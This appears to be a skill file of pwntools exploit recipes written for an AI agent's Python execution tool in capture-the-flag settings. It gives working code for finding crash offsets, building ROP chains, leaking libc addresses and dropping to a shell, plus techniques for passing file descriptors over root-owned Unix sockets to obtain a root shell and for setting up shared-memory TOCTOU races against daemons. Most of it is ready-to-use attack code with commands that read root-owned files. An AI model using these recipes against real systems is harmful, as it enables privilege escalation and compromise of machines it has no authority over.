---
name: pwntools-recipes
when: writing any pwn exploit in python_exec
tools: [python_exec]
phase: exploit
---
# pwntools recipes (run in python_exec; state persists across calls)

```python
from pwn import *
context.binary = elf = ELF('/workspace/vuln')      # sets arch/bits/endian
context.log_level = 'info'
libc = ELF('/workspace/libc.so.6')                 # if provided

# local first, then swap to remote once it works
io = process('/workspace/vuln')
# io = remote('TARGET_HOST', 1337)

# interact / send
io.recvuntil(b'> ')
io.sendline(b'payload')
io.sendlineafter(b'name: ', b'A'*40)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))   # 64-bit leak
log.info('leak %#x', leak)

# cyclic offset to saved RIP
payload = cyclic(200); io.sendline(payload)           # crash, then:
# in gdb: pattern offset $rsp   OR  cyclic_find(0x6161...)
off = cyclic_find(0x6161616161616166)

# build a ret2 chain
rop = ROP(elf)
rop.raise_(0)                                          # example
pause(); io.interactive()                              # drop to shell, then run: cat flag
```

Key helpers: `p64/u64`, `flat({off: chain})`, `ROP(elf)`, `elf.symbols`, `elf.got`, `elf.plt`,
`elf.search(b'/bin/sh')`, `libc.address = leak - libc.symbols['puts']`, `next(libc.search(b'/bin/sh'))`.
Always confirm the crash offset with `cyclic`. After a shell: `io.sendline(b'cat flag*; id')`.

## Unix-domain sockets (SO_PEERCRED auth, SCM_RIGHTS fd-passing)

A root-owned control socket often authenticates by your peer uid and/or wants a file
descriptor passed over the socket, not just bytes. Reverse the frame with
`protocol-reversing`; move the bytes + fds with these primitives.

```python
import socket, struct, os

# connect to the unix control socket (become the required uid first — SO_PEERCRED
# reads your REAL uid/gid and cannot be forged; su/drop to that user before this).
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/<daemon>/control.sock')   # <- the actual socket path you found (ss -lx)

# read the PEER's credentials (pid, uid, gid) — how a daemon checks SO_PEERCRED:
creds = s.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, struct.calcsize('3i'))
pid, uid, gid = struct.unpack('3i', creds)

# send a frame AND pass an open fd via SCM_RIGHTS (ancillary data over sendmsg).
fd = os.open('/path/to/artifact', os.O_RDONLY)   # the fd the daemon validates
s.sendmsg([frame_bytes],
          [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', fd))])
# convenience wrappers (Python 3.9+): socket.send_fds(s, [frame_bytes], [fd])

# receive fds a daemon hands back (MSG_CMSG_CLOEXEC so the fd isn't leaked to children):
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(4 * 4), socket.MSG_CMSG_CLOEXEC)
for level, ctype, cdata in anc:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        fds = struct.unpack('%di' % (len(cdata) // 4), cdata)
# or: msg, fds, flags, addr = socket.recv_fds(s, 4096, maxfds=4)
```

An fd is not the prize — the shell it wires up is. Two admit shapes, decided by which
side does the `dup2` (reverse it):

```python
import os, select, sys, tty

# A) The daemon HANDS YOU an fd that is a privileged process's stdio / a pty master.
#    Drive it as your interactive shell (works for a socket, pipe, or pty master):
chan = fds[0]
def interact(chan):
    try: tty.setraw(sys.stdin.fileno())
    except Exception: pass
    while True:
        r, _, _ = select.select([chan, sys.stdin], [], [])
        if chan in r:
            data = os.read(chan, 4096)
            if not data: return
            os.write(sys.stdout.fileno(), data)
        if sys.stdin in r:
            os.write(chan, os.read(sys.stdin.fileno(), 4096))
# non-interactive smoke: os.write(chan, b'id; cat /root/*flag* 2>/dev/null\n'); print(os.read(chan, 65536))

# B) The daemon dup2's an fd YOU PASS onto the stdio of a root shell it spawns
#    (the "adddup2 -> bash -p stdio" primitive). Give it one end of a socketpair,
#    keep the other, and talk to the shell over your retained end:
mine, theirs = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
s.sendmsg([frame_bytes], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', theirs.fileno()))])
theirs.close()                       # the daemon holds its copy now
interact(mine.fileno())              # -> root shell if it exec'd bash -p wired to that fd
```

Gotchas: the fd's target must satisfy whatever the daemon validates (size/type/content —
reverse that check); you must genuinely BE the expected uid/group before connecting
(SO_PEERCRED is kernel-supplied); `sendmsg` ancillary data is separate from the frame
bytes — a daemon can require both in one message; and after the fd lands the win is
usually a shell on the OTHER end of it, so keep that end open and drive it (above).

## Shared page you can mutate under the daemon (memfd + MAP_SHARED)

When the daemon reads the request BY REFERENCE and re-reads a field (a check-then-commit
gate — see `race-condition-toctou`), pass it a `memfd` you keep mapped `MAP_SHARED`, so
your writes are visible to it live. This is the setup a TOCTOU race needs:

```python
import os, mmap, struct
fd = os.memfd_create('req', os.MFD_CLOEXEC)
os.ftruncate(fd, 4096)
shared = mmap.mmap(fd, 4096, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE)
struct.pack_into('<I', shared, 0, MODE_CHECK)     # value the FIRST read wants
s.sendmsg([frame], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack('i', fd))])
# now a background process flips shared[0] between the two required values while you
# resubmit — full loop in the race-condition-toctou skill.
```

MAP_SHARED is the whole point: a private copy the daemon can't see is the usual bug.
